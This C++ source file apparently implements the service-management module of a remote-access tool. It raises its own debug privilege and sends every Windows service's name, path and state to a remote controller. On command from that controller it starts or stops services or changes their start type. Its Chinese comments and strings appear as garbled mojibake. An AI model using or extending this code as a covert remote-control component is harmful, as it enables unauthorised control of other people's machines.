#include "ServiceManager.h"



CServiceManager::CServiceManager(_CIOCPClient* IOCPClient) :CManager(IOCPClient)
{
	m_ServiceManagerHandle = NULL;
	SetProcessPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);
	SendClientServiceList();
}


CServiceManager::~CServiceManager()
{
	printf("~CServiceManager\r\n");
	if (m_ServiceManagerHandle != NULL)
	{
		CloseServiceHandle(m_ServiceManagerHandle);
		m_ServiceManagerHandle = NULL;
	}
	SetProcessPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
}
void  CServiceManager::HandleIO(PBYTE  BufferData, ULONG_PTR  BufferLength)
{
	BYTE  IsToken;
	switch (BufferData[0])
	{
	case  CLIENT_SERVICE_MANAGER_REQUIRE:
	{
		SendClientServiceList();
		break;
	}
	case  CLIENT_SERVICE_MANAGER_CONFIG_REQUIRE:
	{
		ConfigClientService((LPBYTE)BufferData + 1, BufferLength - 1);
		break;
	}

	}
}
void   CServiceManager::SendClientServiceList()
{
	LPBYTE  BufferData = GetClientServiceList();
	if (BufferData == NULL)
	{
		return;
	}
	m_IOCPClient->OnSending((char*)BufferData, LocalSize(BufferData));
	LocalFree(BufferData);
}
LPBYTE  CServiceManager::GetClientServiceList()
{
	LPENUM_SERVICE_STATUS  EnumServiceStatus = NULL;
	LPQUERY_SERVICE_CONFIG  ExQueryServiceConfig = NULL;

	LPBYTE  BufferData = NULL;
	char    RunWay[256] = { 0 };
	char    AutoRun[256] = { 0 };
	DWORD   BufferLength = 0;
	DWORD   Offset = 0;

	DWORD   ReturnLength = 0;
	DWORD   ServicesReturned = 0;
	DWORD   ResumeHandle = 0;

	//�򿪷����������þ��
	if ((m_ServiceManagerHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)) == NULL)
	{
		return NULL;
	}

	EnumServiceStatus = (LPENUM_SERVICE_STATUS)LocalAlloc(LPTR, 64 * 1024);
	if (EnumServiceStatus == NULL)
	{
		CloseServiceHandle(m_ServiceManagerHandle);
		m_ServiceManagerHandle = NULL;
		return NULL;
	}
	//ͨ�����ö����Ϣ
	EnumServicesStatus(m_ServiceManagerHandle,
		SERVICE_TYPE_ALL,
		SERVICE_STATE_ALL,
		(LPENUM_SERVICE_STATUS)EnumServiceStatus,
		64 * 1024,
		&ReturnLength,
		&ServicesReturned,
		&ResumeHandle);
	BufferData = (LPBYTE)LocalAlloc(LPTR, MAX_PATH);

	BufferData[0] = CLIENT_SERVICE_MANAGER_REPLY;
	Offset = 1;
	//��ʾ���еķ���
	for (unsigned long i = 0; i < ServicesReturned; i++)
	{
		SC_HANDLE  ServiceHandle = NULL;
		DWORD      ResumeHandle = 0;
		ServiceHandle = OpenService(m_ServiceManagerHandle, EnumServiceStatus[i].lpServiceName, SERVICE_ALL_ACCESS);
		if (ServiceHandle == NULL)
		{
			continue;
		}
		ExQueryServiceConfig = (LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR, 4 * 1024);
		QueryServiceConfig(ServiceHandle, ExQueryServiceConfig, 4 * 1024, &ResumeHandle);
		//��ѯ���������״̬
		if (EnumServiceStatus[i].ServiceStatus.dwCurrentState != SERVICE_STOPPED)
		{
			ZeroMemory(RunWay, sizeof(RunWay));
			lstrcat(RunWay, "����");
		}
		else
		{
			ZeroMemory(RunWay, sizeof(RunWay));
			lstrcat(RunWay, "ֹͣ ");
		}
		//�жϷ�����������
		if (2 == ExQueryServiceConfig->dwStartType)
		{
			ZeroMemory(AutoRun, sizeof(AutoRun));
			lstrcat(AutoRun, "�Զ� ");
		}
		if (3 == ExQueryServiceConfig->dwStartType)
		{
			ZeroMemory(AutoRun, sizeof(AutoRun));
			lstrcat(AutoRun, "�ֶ� ");
		}
		if (4 == ExQueryServiceConfig->dwStartType)
		{
			ZeroMemory(AutoRun, sizeof(AutoRun));
			lstrcat(AutoRun, "���� ");
		}

		//�������ݰ��Ĵ�С
		BufferLength = sizeof(DWORD) + lstrlen(EnumServiceStatus[i].lpDisplayName)
			+ lstrlen(ExQueryServiceConfig->lpBinaryPathName) + lstrlen(EnumServiceStatus[i].lpServiceName)
			+ lstrlen(RunWay) + lstrlen(AutoRun) + 1;
		//������̫С�����·���
		if (LocalSize(BufferData) < (Offset + BufferLength))
		{
			BufferData = (LPBYTE)LocalReAlloc(BufferData, (Offset + BufferLength), LMEM_ZEROINIT | LMEM_MOVEABLE);
		}
		memcpy(BufferData + Offset, EnumServiceStatus[i].lpDisplayName, lstrlen(EnumServiceStatus[i].lpDisplayName) + 1);
		Offset += lstrlen(EnumServiceStatus[i].lpDisplayName) + 1;   //��ʵ����

		memcpy(BufferData + Offset, EnumServiceStatus[i].lpServiceName, lstrlen(EnumServiceStatus[i].lpServiceName) + 1);
		Offset += lstrlen(EnumServiceStatus[i].lpServiceName) + 1;   //��ʾ����

		memcpy(BufferData + Offset, ExQueryServiceConfig->lpBinaryPathName, lstrlen(ExQueryServiceConfig->lpBinaryPathName) + 1);
		Offset += lstrlen(ExQueryServiceConfig->lpBinaryPathName) + 1;   //·��

		memcpy(BufferData + Offset, RunWay, lstrlen(RunWay) + 1);
		Offset += lstrlen(RunWay) + 1;   //����״̬

		memcpy(BufferData + Offset, AutoRun, lstrlen(AutoRun) + 1);
		Offset += lstrlen(AutoRun) + 1;   //������״̬

		CloseServiceHandle(ServiceHandle);
		LocalFree(ExQueryServiceConfig);
	}
	CloseServiceHandle(m_ServiceManagerHandle);
	LocalFree(EnumServiceStatus);
	return BufferData;
}
void   CServiceManager::ConfigClientService(PBYTE  BufferData, ULONG  BufferLength)
{
	BYTE  IsMethod = BufferData[0];
	char*  ServiceName = (char*)(BufferData + 1);
	switch (IsMethod)
	{
	case 1:
	{
		SC_HANDLE  ServiceManagerHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (ServiceManagerHandle != NULL)
		{
			SC_HANDLE  ServiceHandle = OpenService(ServiceManagerHandle, ServiceName, SERVICE_ALL_ACCESS);
			if (ServiceHandle != NULL)
			{
				StartService(ServiceHandle, NULL, NULL);
				CloseServiceHandle(ServiceHandle);
			}
			CloseServiceHandle(ServiceManagerHandle);
		}
		Sleep(500);
		SendClientServiceList();
	}
	break;
	case  2:
	{
		SC_HANDLE  ServiceManagerHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (ServiceManagerHandle != NULL)
		{
			SC_HANDLE  ServiceHandle = OpenService(ServiceManagerHandle, ServiceName, SERVICE_ALL_ACCESS);
			if (ServiceHandle != NULL)
			{
				SERVICE_STATUS  Status;
				BOOL  IsOk = ControlService(ServiceHandle, SERVICE_CONTROL_STOP, &Status);
				CloseServiceHandle(ServiceHandle);
			}
			CloseServiceHandle(ServiceManagerHandle);
		}
		Sleep(500);
		SendClientServiceList();
	}
	break;
	case  3:
	{
		SC_HANDLE  ServiceManagerHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (ServiceManagerHandle != NULL)
		{
			SC_HANDLE  ServiceHandle = OpenService(ServiceManagerHandle, ServiceName, SERVICE_ALL_ACCESS);
			if (ServiceHandle != NULL)
			{
				SC_LOCK v1 = LockServiceDatabase(ServiceManagerHandle);
				BOOL  IsOk = ChangeServiceConfig(
					ServiceHandle,
					SERVICE_NO_CHANGE,
					SERVICE_AUTO_START,
					SERVICE_NO_CHANGE,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL);
				UnlockServiceDatabase(v1);
				CloseServiceHandle(ServiceHandle);
			}
			CloseServiceHandle(ServiceManagerHandle);
		}
		Sleep(500);
		SendClientServiceList();
	}
	break;
	case  4:
	{
		SC_HANDLE  ServiceManagerHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
		if (ServiceManagerHandle != NULL)
		{
			SC_HANDLE  ServiceHandle = OpenService(ServiceManagerHandle, ServiceName, SERVICE_ALL_ACCESS);
			if (ServiceHandle != NULL)
			{
				SC_LOCK v1 = LockServiceDatabase(ServiceManagerHandle);
				BOOL  IsOk = ChangeServiceConfig(
					ServiceHandle,
					SERVICE_NO_CHANGE,
					SERVICE_DEMAND_START,
					SERVICE_NO_CHANGE,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL);
				UnlockServiceDatabase(v1);
				CloseServiceHandle(ServiceHandle);
			}
			CloseServiceHandle(ServiceManagerHandle);
		}
		Sleep(500);
		SendClientServiceList();
	}
	break;
	default:
		break;
	}
}